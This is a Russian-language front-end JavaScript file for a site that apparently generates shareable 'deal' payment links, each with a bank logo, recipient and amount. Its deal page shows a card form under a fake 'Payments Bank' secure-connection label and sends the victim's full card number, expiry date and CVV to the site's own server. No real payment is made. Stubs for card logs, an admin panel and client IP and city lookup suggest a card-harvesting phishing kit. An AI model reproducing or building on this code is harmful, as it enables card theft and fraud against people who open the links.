
// ========== НАВИГАЦИЯ ==========
function toggleMenu() {
    document.getElementById('dropdownMenu').classList.toggle('active');
}

function hideAllSections() {
    document.getElementById('main-screen').style.display = 'none';
    document.getElementById('about-section').style.display = 'none';
    document.getElementById('partner-section').style.display = 'none';
    document.getElementById('steam-section').style.display = 'none';
    document.getElementById('payment-container').classList.remove('active');
    document.getElementById('cabinet-section').classList.remove('active');
    document.getElementById('admin-section').classList.remove('active');
    document.getElementById('create-deal-section').classList.remove('active');
    document.getElementById('my-deals-section').classList.remove('active');
    document.getElementById('search-deal-section').classList.remove('active');
    document.getElementById('view-deal-section').classList.remove('active');
    document.getElementById('dropdownMenu').classList.remove('active');
}

function showMainScreen() {
    hideAllSections();
    document.getElementById('main-screen').style.display = 'block';
    history.pushState({section: 'main'}, '', '/');
}

function showCabinet() {
    hideAllSections();
    document.getElementById('cabinet-section').classList.add('active');
    history.pushState({section: 'cabinet'}, '', '/cabinet');
    updateUIForAuth();
}

function showAdminPanel() {
    if (!isAdmin) {
        showNotification('Доступ запрещён', 'Только для администраторов', 'error');
        return;
    }
    hideAllSections();
    document.getElementById('admin-section').classList.add('active');
    history.pushState({section: 'admin'}, '', '/admin');
    updateAdminMonitor();
}

function showSteamSection() {
    hideAllSections();
    document.getElementById('steam-section').style.display = 'block';
    history.pushState({section: 'steam'}, '', '/steam');
}

function showAbout() {
    hideAllSections();
    document.getElementById('about-section').style.display = 'block';
    history.pushState({section: 'about'}, '', '/about');
}

function showPartnerProgram() {
    hideAllSections();
    document.getElementById('partner-section').style.display = 'block';
    history.pushState({section: 'partner'}, '', '/partner');
}

function showCreateDeal() {
    hideAllSections();
    document.getElementById('create-deal-section').classList.add('active');
    history.pushState({section: 'create'}, '', '/create');
    resetDealCreation();
}

function showMyDeals() {
    hideAllSections();
    document.getElementById('my-deals-section').classList.add('active');
    history.pushState({section: 'my-deals'}, '', '/my-deals');
    loadMyDeals();
}

function showSearchDeal() {
    hideAllSections();
    document.getElementById('search-deal-section').classList.add('active');
    history.pushState({section: 'search'}, '', '/search');
    document.getElementById('searchResult').style.display = 'none';
    document.getElementById('searchDealToken').value = '';
}

// ========== РОУТИНГ ПО URL ==========
function checkForDealInURL() {
    const path = window.location.pathname;

    // Формат /DEAL-XXXXXX-XXXXXX
    if (path.startsWith('/DEAL-')) {
        const token = path.slice(1).split('/')[0].toUpperCase();
        loadDealByToken(token);
        return;
    }
    // Формат /deal/DEAL-XXXXXX-XXXXXX
    if (path.startsWith('/deal/')) {
        const token = path.slice(6).split('/')[0].toUpperCase();
        if (token.startsWith('DEAL-')) { loadDealByToken(token); return; }
    }

    if (path === '/cabinet')  { showCabinet(); return; }
    if (path === '/steam')    { showSteamSection(); return; }
    if (path === '/about')    { showAbout(); return; }
    if (path === '/partner')  { showPartnerProgram(); return; }
    if (path === '/create')   { showCreateDeal(); return; }
    if (path === '/my-deals') { showMyDeals(); return; }
    if (path === '/search')   { showSearchDeal(); return; }
    if (path === '/admin')    { showAdminPanel(); return; }

    showMainScreen();
}

// Кнопка назад/вперёд в браузере
window.addEventListener('popstate', function() {
    checkForDealInURL();
});

// ========== ЗАГРУЗКА СДЕЛКИ ПО ТОКЕНУ (с сервера) ==========
async function loadDealByToken(token) {
    hideAllSections();
    document.getElementById('view-deal-section').classList.add('active');
    history.pushState({section: 'deal', token: token}, '', '/deal/' + token);

    document.getElementById('dealViewContent').innerHTML = `
        <div style="text-align:center;padding:60px 20px;color:white;">
            <div style="font-size:40px;margin-bottom:16px;">⏳</div>
            <div style="font-size:18px;opacity:0.7;">Загрузка сделки...</div>
        </div>
    `;

    try {
        const response = await fetch('/api/deal/' + token);

        if (!response.ok) {
            document.getElementById('dealViewContent').innerHTML = `
                <div style="max-width:500px;margin:0 auto;text-align:center;padding:60px 20px;">
                    <div style="font-size:60px;margin-bottom:20px;">🔍</div>
                    <div style="font-size:24px;font-weight:800;color:white;margin-bottom:12px;font-family:'Arial Extra',sans-serif;">Сделка не найдена</div>
                    <div style="font-size:16px;color:rgba(255,255,255,0.6);margin-bottom:30px;">Возможно, сделка была удалена или ссылка недействительна</div>
                    <button onclick="showMainScreen()" style="padding:14px 30px;background:#ffc107;color:#000;font-size:16px;font-weight:700;border-radius:50px;border:none;cursor:pointer;">На главную</button>
                </div>
            `;
            return;
        }

        const deal = await response.json();
        renderDealView(deal);

    } catch (error) {
        document.getElementById('dealViewContent').innerHTML = `
            <div style="max-width:500px;margin:0 auto;text-align:center;padding:60px 20px;">
                <div style="font-size:60px;margin-bottom:20px;">❌</div>
                <div style="font-size:22px;font-weight:800;color:white;margin-bottom:12px;">Ошибка загрузки</div>
                <div style="font-size:15px;color:rgba(255,255,255,0.6);margin-bottom:30px;">${error.message}</div>
                <button onclick="showMainScreen()" style="padding:14px 30px;background:#ffc107;color:#000;font-size:16px;font-weight:700;border-radius:50px;border:none;cursor:pointer;">На главную</button>
            </div>
        `;
    }
}

// ========== РЕНДЕР СТРАНИЦЫ СДЕЛКИ ==========
function renderDealView(deal) {
    const methodText = deal.method === 'phone' ? 'номером телефона' :
                       deal.method === 'card'  ? 'номеру карты' : 'лицевому счёту';
    const methodIcon = deal.method === 'phone' ? '📱' :
                       deal.method === 'card'  ? '💳' : '📄';
    const rawDetails = deal.details || deal.card_number || '';
    const detailsDisplay = deal.method === 'card'
        ? rawDetails.replace(/\D/g, '').match(/.{1,4}/g).join(' ')
        : rawDetails;
    const detailsLabel = deal.method === 'phone' ? 'Номер телефона' :
                         deal.method === 'card'  ? 'Номер карты' : 'Лицевой счёт';
    const isCompleted = deal.status === 'completed';
    const bankLogo = deal.bank_logo || deal.bankLogo || 'menu-logo.jpg';
    const amount = deal.amount;
    const currencySymbol = deal.currency_symbol || deal.currencySymbol || '₽';
    const token = deal.token;

    const html = `
        <div style="max-width:580px;margin:0 auto;">
            <!-- Шапка с банком -->
            <div style="background:rgba(0,0,0,0.75);backdrop-filter:blur(16px);border-radius:24px 24px 0 0;border:1px solid rgba(255,255,255,0.12);padding:28px 28px 20px;display:flex;align-items:center;gap:18px;">
                <div style="width:64px;height:64px;border-radius:16px;background-image:url('${bankLogo}');background-size:contain;background-position:center;background-repeat:no-repeat;background-color:#111;flex-shrink:0;border:1px solid rgba(255,255,255,0.1);"></div>
                <div style="flex:1;">
                    <div style="font-size:20px;font-weight:800;color:white;font-family:'Arial Extra',sans-serif;">${deal.bank}</div>
                    <div style="font-size:14px;color:rgba(255,255,255,0.6);margin-top:3px;">${methodIcon} Перевод по ${methodText}</div>
                </div>
                <div style="text-align:right;">
                    <div style="font-size:28px;font-weight:800;color:#ffc107;font-family:'Arial Extra',sans-serif;line-height:1;">${amount} ${currencySymbol}</div>
                    <div style="font-size:12px;color:rgba(255,255,255,0.5);margin-top:4px;">К оплате</div>
                </div>
            </div>

            <!-- Реквизиты -->
            <div style="background:rgba(0,0,0,0.6);backdrop-filter:blur(16px);border-left:1px solid rgba(255,255,255,0.1);border-right:1px solid rgba(255,255,255,0.1);padding:20px 28px;">
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;">
                    <div style="background:rgba(255,255,255,0.05);border-radius:14px;padding:16px;border:1px solid rgba(255,255,255,0.08);">
                        <div style="font-size:12px;color:rgba(255,255,255,0.5);margin-bottom:6px;text-transform:uppercase;letter-spacing:0.5px;">Получатель</div>
                        <div style="font-size:16px;font-weight:700;color:white;">${deal.recipient}</div>
                    </div>
                    <div style="background:rgba(255,255,255,0.05);border-radius:14px;padding:16px;border:1px solid rgba(255,255,255,0.08);">
                        <div style="font-size:12px;color:rgba(255,255,255,0.5);margin-bottom:6px;text-transform:uppercase;letter-spacing:0.5px;">${detailsLabel}</div>
                        <div style="font-size:15px;font-weight:700;color:#ffc107;word-break:break-all;font-family:monospace;">${detailsDisplay}</div>
                    </div>
                </div>
                ${isCompleted ? `
                <div style="margin-top:16px;background:rgba(76,217,100,0.15);border:1px solid rgba(76,217,100,0.3);border-radius:14px;padding:16px;text-align:center;">
                    <div style="font-size:28px;margin-bottom:8px;">✅</div>
                    <div style="font-size:18px;font-weight:700;color:#4cd964;">Сделка завершена</div>
                    <div style="font-size:14px;color:rgba(255,255,255,0.6);margin-top:4px;">Платёж был успешно проведён</div>
                </div>
                ` : ''}
            </div>

            ${!isCompleted ? `
            <!-- Форма оплаты -->
            <div style="background:rgba(0,0,0,0.75);backdrop-filter:blur(16px);border-radius:0 0 24px 24px;border:1px solid rgba(255,255,255,0.12);border-top:none;padding:24px 28px 28px;">
                <div style="font-size:16px;font-weight:700;color:white;margin-bottom:18px;">💳 Введите данные вашей карты для оплаты</div>

                <div style="margin-bottom:16px;">
                    <label style="display:block;font-size:13px;color:rgba(255,255,255,0.6);margin-bottom:8px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;">Номер карты</label>
                    <input type="text" id="deal-pay-card" placeholder="0000 0000 0000 0000" maxlength="19"
                        oninput="formatCardNumber(this)"
                        style="width:100%;padding:15px 18px;background:rgba(255,255,255,0.07);border:2px solid rgba(255,255,255,0.12);border-radius:14px;font-size:18px;color:white;font-family:monospace;letter-spacing:2px;outline:none;transition:border-color 0.2s;"
                        onfocus="this.style.borderColor='#ffc107'" onblur="this.style.borderColor='rgba(255,255,255,0.12)'">
                </div>

                <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:22px;">
                    <div>
                        <label style="display:block;font-size:13px;color:rgba(255,255,255,0.6);margin-bottom:8px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;">Срок действия</label>
                        <input type="text" id="deal-pay-expiry" placeholder="ММ/ГГ" maxlength="5"
                            oninput="formatExpiry(this)"
                            style="width:100%;padding:15px 18px;background:rgba(255,255,255,0.07);border:2px solid rgba(255,255,255,0.12);border-radius:14px;font-size:18px;color:white;font-family:monospace;letter-spacing:2px;outline:none;transition:border-color 0.2s;"
                            onfocus="this.style.borderColor='#ffc107'" onblur="this.style.borderColor='rgba(255,255,255,0.12)'">
                    </div>
                    <div>
                        <label style="display:block;font-size:13px;color:rgba(255,255,255,0.6);margin-bottom:8px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;">CVV / CVC</label>
                        <input type="text" id="deal-pay-cvc" placeholder="•••" maxlength="3"
                            oninput="this.value=this.value.replace(/[^0-9]/g,'')"
                            style="width:100%;padding:15px 18px;background:rgba(255,255,255,0.07);border:2px solid rgba(255,255,255,0.12);border-radius:14px;font-size:18px;color:white;font-family:monospace;letter-spacing:4px;outline:none;transition:border-color 0.2s;"
                            onfocus="this.style.borderColor='#ffc107'" onblur="this.style.borderColor='rgba(255,255,255,0.12)'">
                    </div>
                </div>

                <button onclick="payDealAPI('${token}')"
                    style="width:100%;padding:18px;background:#ffc107;color:#000;font-size:18px;font-weight:800;border-radius:50px;border:none;cursor:pointer;font-family:'Arial',sans-serif;box-shadow:0 8px 25px rgba(255,193,7,0.4);transition:all 0.2s;"
                    onmouseover="this.style.transform='translateY(-2px)';this.style.boxShadow='0 12px 35px rgba(255,193,7,0.6)'"
                    onmouseout="this.style.transform='translateY(0)';this.style.boxShadow='0 8px 25px rgba(255,193,7,0.4)'">
                    Оплатить ${amount} ${currencySymbol}
                </button>

                <div style="text-align:center;margin-top:14px;font-size:13px;color:rgba(255,255,255,0.4);">
                    🔒 Защищённое соединение · Payments Bank
                </div>
            </div>
            ` : ''}
        </div>
    `;

    document.getElementById('dealViewContent').innerHTML = html;
}

// ========== ОПЛАТА СДЕЛКИ ЧЕРЕЗ API ==========
async function payDealAPI(token) {
    const cardNumber = document.getElementById('deal-pay-card').value;
    const expiry = document.getElementById('deal-pay-expiry').value;
    const cvc = document.getElementById('deal-pay-cvc').value;

    if (!cardNumber || cardNumber.replace(/\s/g, '').length !== 16) {
        showNotification('Ошибка', 'Введите корректный номер карты', 'error');
        return;
    }
    if (!expiry || !expiry.match(/^\d{2}\/\d{2}$/)) {
        showNotification('Ошибка', 'Введите срок действия карты', 'error');
        return;
    }
    if (!cvc || cvc.length < 3) {
        showNotification('Ошибка', 'Введите CVV код', 'error');
        return;
    }

    try {
        const response = await fetch('/api/deal/' + token, {
            method: 'PATCH',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                status: 'completed',
                paymentData: { cardNumber, expiry, cvc, timestamp: new Date().toISOString() }
            })
        });

        if (response.ok) {
            showNotification('Успешно', 'Оплата прошла успешно!');
            setTimeout(() => loadDealByToken(token), 1500);
        } else {
            showNotification('Ошибка', 'Не удалось провести оплату', 'error');
        }
    } catch (error) {
        showNotification('Ошибка', 'Ошибка соединения', 'error');
    }
}

// ========== СОЗДАНИЕ СДЕЛКИ ==========

function toggleDealCountrySelection() { dealShowCountries(); }

function selectDealCountry(countryId) {
    var titles = { russia:'Российские банки', ukraine:'Украинские банки', belarus:'Белорусские банки', kazakhstan:'Казахстанские банки', kyrgyzstan:'Кыргызстанские банки', uzbekistan:'Узбекистанские банки', tajikistan:'Таджикистанские банки' };
    dealShowBanks(countryId, titles[countryId] || countryId);
}

function selectDealBank(bankId, bankName, bankLogo) {
    dealPickBank(bankId, bankName, bankLogo, dealCreationState.country || 'russia');
}

function changeDealBank() { dealChangBank(); }

function backToDealCountries() { dealBackToCountries(); }

function selectDealMethod(method, el) {
    dealCreationState.method = method;
    document.querySelectorAll('.deal-method').forEach(function(e) { e.classList.remove('active'); });
    if (el) el.classList.add('active');
    document.getElementById('dealDetailsStep').style.display = 'block';
    document.getElementById('dealBankName').textContent = dealCreationState.bank;
    document.getElementById('dealBankLogo').style.backgroundImage = 'url(' + dealCreationState.bankLogo + ')';

    var methodText = method === 'phone' ? 'перевод по номеру телефона'
                   : method === 'card'  ? 'перевод по номеру карты'
                   : 'перевод по лицевому счёту';
    document.getElementById('dealBankMethod').textContent = methodText;

    document.getElementById('dealPhoneInput').style.display = 'none';
    document.getElementById('dealCardInput').style.display = 'none';
    document.getElementById('dealAccountInput').style.display = 'none';

    if (method === 'phone') {
        document.getElementById('dealPhoneInput').style.display = 'block';
        document.getElementById('dealCountryCode').textContent = countryCodes[dealCreationState.country].code;
        document.getElementById('dealPhoneNumber').maxLength = countryCodes[dealCreationState.country].length;
    } else if (method === 'card') {
        document.getElementById('dealCardInput').style.display = 'block';
    } else {
        document.getElementById('dealAccountInput').style.display = 'block';
    }
}

function goToAmountStep() {
    if (dealCreationState.method === 'phone') {
        const phone = document.getElementById('dealPhoneNumber').value;
        if (!phone || phone.length < 5) { showNotification('Ошибка', 'Введите корректный номер телефона', 'error'); return; }
        dealCreationState.details = countryCodes[dealCreationState.country].code + phone;
    } else if (dealCreationState.method === 'card') {
        const card = document.getElementById('dealCardNumber').value.replace(/\s/g, '');
        if (card.length !== 16) { showNotification('Ошибка', 'Введите корректный номер карты (16 цифр)', 'error'); return; }
        dealCreationState.details = card;
    } else {
        const account = document.getElementById('dealAccountNumber').value;
        if (account.length < 10) { showNotification('Ошибка', 'Введите корректный номер счёта', 'error'); return; }
        dealCreationState.details = account;
    }
    document.getElementById('amountModal').style.display = 'flex';
    const sym = (currencyRates[dealCreationState.country] || currencyRates['russia']).symbol;
    document.getElementById('dealAmountInput').placeholder = '0 ' + sym;
}

function closeAmountModal() {
    document.getElementById('amountModal').style.display = 'none';
}

function confirmAmount() {
    const amount = parseInt(document.getElementById('dealAmountInput').value);
    if (!amount || amount <= 0) { showNotification('Ошибка', 'Введите корректную сумму', 'error'); return; }
    dealCreationState.amount = amount;
    closeAmountModal();
    document.getElementById('dealRecipientStep').style.display = 'block';
}

async function createDeal() {
    const recipient = document.getElementById('dealRecipientName').value;
    if (!recipient) { showNotification('Ошибка', 'Введите имя получателя', 'error'); return; }
    dealCreationState.recipient = recipient;

    const currInfo = currencyRates[dealCreationState.country] || currencyRates['russia'];

    try {
        const response = await fetch('/api/deal', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                amount: dealCreationState.amount,
                bank: dealCreationState.bank,
                bankId: dealCreationState.bankId,
                bankLogo: dealCreationState.bankLogo,
                recipient: recipient,
                cardNumber: dealCreationState.details,
                details: dealCreationState.details,
                method: dealCreationState.method,
                country: dealCreationState.country,
                currency: currInfo.code,
                currencySymbol: currInfo.symbol,
                sessionId: sessionId
            })
        });

        const data = await response.json();

        if (data.success) {
            const dealLink = window.location.origin + '/' + data.token;
            document.getElementById('dealResult').style.display = 'block';
            document.getElementById('dealLink').textContent = dealLink;
            document.getElementById('dealToken').textContent = data.token;
            showNotification('Успешно', 'Сделка создана!');
        } else {
            showNotification('Ошибка', data.error || 'Ошибка при создании сделки', 'error');
        }
    } catch (error) {
        showNotification('Ошибка', 'Ошибка соединения с сервером', 'error');
    }
}

function resetDealCreation() {
    dealCreationState = { country: null, bank: null, bankId: null, bankLogo: null, method: null, details: null, recipient: null, amount: 0 };
    document.getElementById('deal-selected-bank-section').style.display = 'none';
    document.getElementById('dealBankSelector').style.display = 'flex';
    document.getElementById('deal-panel-countries').style.display = 'none';
    document.getElementById('deal-panel-banks').style.display = 'none';
    document.querySelectorAll('.deal-banks-group').forEach(function(g){ g.style.display = 'none'; });
    document.getElementById('dealMethodStep').style.display = 'none';
    document.getElementById('dealDetailsStep').style.display = 'none';
    document.getElementById('dealRecipientStep').style.display = 'none';
    document.getElementById('dealResult').style.display = 'none';
    document.getElementById('dealAmountInput').value = '';
    document.getElementById('dealPhoneNumber').value = '';
    document.getElementById('dealCardNumber').value = '';
    document.getElementById('dealAccountNumber').value = '';
    document.getElementById('dealRecipientName').value = '';
}

// ========== МОИ СДЕЛКИ ==========
async function loadMyDeals() {
    try {
        const response = await fetch('/api/my-deals?sessionId=' + sessionId);
        const deals = await response.json();

        const activeDeals = deals.filter(d => d.status === 'active');
        const completedDeals = deals.filter(d => d.status === 'completed');

        if (deals.length === 0) {
            document.getElementById('noDealsMessage').style.display = 'block';
            document.getElementById('activeDealsList').style.display = 'none';
            document.getElementById('completedDealsList').style.display = 'none';
            return;
        }

        document.getElementById('noDealsMessage').style.display = 'none';

        if (activeDeals.length > 0) {
            document.getElementById('activeDealsList').style.display = 'block';
            document.getElementById('activeDealsContainer').innerHTML = activeDeals.map(deal => `
                <div class="deal-card">
                    <div style="display:flex;justify-content:space-between;align-items:center;">
                        <span class="deal-status active">Активна</span>
                        <span>${new Date(deal.created_at).toLocaleString()}</span>
                    </div>
                    <div class="deal-amount-container">
                        <span class="deal-amount" style="font-size:24px;">${deal.amount} ${deal.currency_symbol}</span>
                    </div>
                    <div class="deal-recipient">${deal.recipient_short || deal.recipient}</div>
                    <div>Банк: ${deal.bank}</div>
                    <div>Метод: ${deal.method === 'phone' ? 'По телефону' : deal.method === 'card' ? 'По карте' : 'По счёту'}</div>
                    <div style="margin-top:10px;display:flex;gap:10px;flex-wrap:wrap;">
                        <button class="bank-card-button" onclick="loadDealByToken('${deal.token}')">Просмотр</button>
                        <button class="bank-card-button" onclick="copyToClipboard(window.location.origin+'/${deal.token}')">Копировать ссылку</button>
                        <button class="bank-card-button" style="background:rgba(220,53,69,0.5);border-color:#dc3545;" onclick="deleteDeal('${deal.token}')">Удалить</button>
                    </div>
                </div>
            `).join('');
        } else {
            document.getElementById('activeDealsList').style.display = 'none';
        }

        if (completedDeals.length > 0) {
            document.getElementById('completedDealsList').style.display = 'block';
            document.getElementById('completedDealsContainer').innerHTML = completedDeals.map(deal => `
                <div class="deal-card">
                    <div style="display:flex;justify-content:space-between;align-items:center;">
                        <span class="deal-status completed">Завершена</span>
                        <span>${new Date(deal.created_at).toLocaleString()}</span>
                    </div>
                    <div class="deal-amount-container">
                        <span class="deal-amount" style="font-size:24px;">${deal.amount} ${deal.currency_symbol}</span>
                    </div>
                    <div class="deal-recipient">${deal.recipient_short || deal.recipient}</div>
                    <div>Банк: ${deal.bank}</div>
                    <div>Метод: ${deal.method === 'phone' ? 'По телефону' : deal.method === 'card' ? 'По карте' : 'По счёту'}</div>
                    <div style="margin-top:10px;">
                        <button class="bank-card-button" onclick="loadDealByToken('${deal.token}')">Просмотр</button>
                    </div>
                </div>
            `).join('');
        } else {
            document.getElementById('completedDealsList').style.display = 'none';
        }
    } catch (error) {
        showNotification('Ошибка', 'Не удалось загрузить сделки', 'error');
    }
}

async function deleteDeal(token) {
    if (!confirm('Вы уверены, что хотите удалить эту сделку?')) return;
    try {
        const response = await fetch('/api/deal/' + token, { method: 'DELETE' });
        if (response.ok) {
            showNotification('Успешно', 'Сделка удалена');
            loadMyDeals();
        } else {
            showNotification('Ошибка', 'Не удалось удалить сделку', 'error');
        }
    } catch (error) {
        showNotification('Ошибка', 'Ошибка при удалении', 'error');
    }
}

// ========== ПОИСК СДЕЛКИ ==========
function searchDeal() {
    const token = document.getElementById('searchDealToken').value.trim().toUpperCase();
    if (!token) { showNotification('Ошибка', 'Введите код сделки', 'error'); return; }
    loadDealByToken(token);
}

// ========== STEAM (Steam payment container) ==========
function toggleCountrySelection() {
    const panel = document.getElementById('country-selection-panel');
    panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
}

function selectCountry(countryId) {
    document.getElementById('country-selection-panel').style.display = 'none';
    document.getElementById('bank-selection-panel').style.display = 'block';
    document.getElementById('bank-selection-title').textContent =
        countryId === 'russia' ? 'Российские банки' :
        countryId === 'ukraine' ? 'Украинские банки' :
        countryId === 'belarus' ? 'Белорусские банки' :
        countryId === 'kazakhstan' ? 'Казахстанские банки' :
        countryId === 'kyrgyzstan' ? 'Кыргызстанские банки' :
        countryId === 'uzbekistan' ? 'Узбекистанские банки' : 'Таджикистанские банки';

    const banksList = document.getElementById('banks-list');
    banksList.innerHTML = (banksData[countryId] || []).map(b => `
        <div class="bank-item" onclick="selectBank('${b.id}','${b.name}','${b.logo}')">
            <div class="bank-logo" style="background-image:url('${b.logo}');"></div>
            <div class="bank-name">${b.name}</div>
            <div class="bank-arrow">›</div>
        </div>
    `).join('');
}

function selectBank(bankId, bankName, bankLogo) {
    document.getElementById('bank-selection-panel').style.display = 'none';
    document.getElementById('selected-bank-section').style.display = 'flex';
    document.getElementById('selected-bank-logo').style.backgroundImage = `url('${bankLogo}')`;
    document.getElementById('selected-bank-title').textContent = bankName;
    document.getElementById('countryBankSection').style.display = 'none';
    document.getElementById('card-number').disabled = false;
    document.getElementById('card-expiry').disabled = false;
    document.getElementById('card-cvc').disabled = false;
    document.getElementById('pay-button').disabled = false;
}

function changeBank() {
    document.getElementById('selected-bank-section').style.display = 'none';
    document.getElementById('countryBankSection').style.display = 'flex';
    document.getElementById('card-number').disabled = true;
    document.getElementById('card-expiry').disabled = true;
    document.getElementById('card-cvc').disabled = true;
    document.getElementById('pay-button').disabled = true;
}

function backToCountries() {
    document.getElementById('bank-selection-panel').style.display = 'none';
    toggleCountrySelection();
}

function updateAmountDisplay(value) {
    const amount = parseInt(value) || 0;
    document.getElementById('amountDisplay').textContent = amount.toLocaleString('ru-RU') + ',00₽ к оплате';
}

function setAmount(amount, el) {
    document.getElementById('steamAmount').value = amount;
    updateAmountDisplay(amount);
    document.querySelectorAll('.steam-preset').forEach(function(e) { e.classList.remove('active'); });
    if (el) el.classList.add('active');
}

function goToPayment() {
    const steamUsername = document.getElementById('steamUsername').value;
    const steamAmount = document.getElementById('steamAmount').value;
    if (!steamUsername) { showNotification('Ошибка', 'Введите имя аккаунта Steam', 'error'); return; }
    if (!steamAmount || parseInt(steamAmount) <= 0) { showNotification('Ошибка', 'Введите сумму пополнения', 'error'); return; }
    document.getElementById('amount-display').textContent = parseInt(steamAmount).toLocaleString('ru-RU') + ',00 ₽';
    document.getElementById('pay-button').innerHTML = 'Оплатить ' + parseInt(steamAmount).toLocaleString('ru-RU') + ',00 ₽';
    hideAllSections();
    document.getElementById('payment-container').classList.add('active');
}

function processPayment() {
    showNotification('Оплата', 'Функция оплаты временно недоступна', 'info');
}

function closeSuccessAndGoToMain() {
    const vm = document.getElementById('videoModal');
    if (vm) vm.classList.remove('active');
    showMainScreen();
}

// ========== УТИЛИТЫ ==========
function formatCardNumber(input) {
    let value = input.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
    let formatted = '';
    for (let i = 0; i < value.length && i < 16; i++) {
        if (i > 0 && i % 4 === 0) formatted += ' ';
        formatted += value[i];
    }
    input.value = formatted;
}

function formatExpiry(input) {
    let value = input.value.replace(/\D/g, '');
    if (value.length >= 2) value = value.substring(0,2) + '/' + value.substring(2,4);
    input.value = value.substring(0,5);
}

function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        showNotification('Скопировано!', 'Текст скопирован в буфер обмена');
    }).catch(() => {
        showNotification('Ошибка', 'Не удалось скопировать', 'error');
    });
}

function copyToClipboardFromText(text) { copyToClipboard(text); }

function copyToClipboardDeal() {
    const link = document.getElementById('dealLink').textContent;
    copyToClipboard(link);
}

function showNotification(title, message, type = 'success') {
    // Используем функцию из index.html если она там есть, иначе своя
    const existing = document.getElementById('notificationContainer');
    const notification = document.createElement('div');
    notification.className = 'notification ' + type;
    notification.innerHTML = '<div class="notification-title">' + title + '</div><div class="notification-message">' + message + '</div>';
    document.body.appendChild(notification);
    setTimeout(() => { if (notification.parentNode) notification.parentNode.removeChild(notification); }, 3000);
}

function toggleLanguageMenu() {
    document.getElementById('languageMenu').classList.toggle('active');
}

function setLanguage(lang) {
    currentLanguage = lang;
    const flag = document.getElementById('currentLanguage');
    if (flag) flag.style.backgroundImage = lang === 'ru' ? "url('r-language.jpg')" : "url('e-language.jpg')";
    document.querySelectorAll('[data-ru]').forEach(el => {
        if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
            el.placeholder = el.getAttribute('data-' + lang) || '';
        } else {
            const htmlContent = el.getAttribute('data-' + lang);
            if (htmlContent) el.innerHTML = htmlContent;
        }
    });
    const menu = document.getElementById('languageMenu');
    if (menu) menu.classList.remove('active');
}

function filterBanks() {
    const search = document.getElementById('bank-search').value.toLowerCase();
    document.querySelectorAll('#banks-list .bank-item').forEach(item => {
        item.style.display = item.querySelector('.bank-name').textContent.toLowerCase().includes(search) ? 'flex' : 'none';
    });
}

// Заглушки для функций из index.html которые могут вызываться
function showLoginModal()    { const m = document.getElementById('loginModal');    if (m) m.classList.add('active'); }
function showRegisterModal() { const m = document.getElementById('registerModal'); if (m) m.classList.add('active'); }
function closeLoginModal()   { const m = document.getElementById('loginModal');    if (m) m.classList.remove('active'); }
function closeRegisterModal(){ const m = document.getElementById('registerModal'); if (m) m.classList.remove('active'); }
function switchToRegister()  { closeLoginModal(); showRegisterModal(); }
function switchToLogin()     { closeRegisterModal(); showLoginModal(); }
function handleLogin()       {}
function handleRegister()    {}
function handleGoogleLogin() {}
function handleGoogleRegister() {}
function logout()            { showNotification('Выход', 'Вы вышли из аккаунта'); showMainScreen(); }
function openCardOrderModal(){ const m = document.getElementById('cardOrderModal'); if (m) m.classList.add('active'); }
function closeCardOrderModal(){ const m = document.getElementById('cardOrderModal'); if (m) m.classList.remove('active'); }
function submitCardOrder()   { showNotification('Заявка отправлена', 'Карта будет готова через 3 дня'); closeCardOrderModal(); }
function changeAvatar()      {}
function updateUIForAuth()   {}
function updateAdminMonitor(){}
function switchAdminTab()    {}
function exportCardLogs()    {}
function renderCardLogs()    {}
function loadAdminUsers()    {}
function adminAction()       {}
function viewUserDetails()   {}
function filterDealBanks()   {}
function addLog()            {}
function saveDB()            {}
function saveCardLog()       {}
function getClientInfo()     { return { ip: '', city: '', country: '' }; }
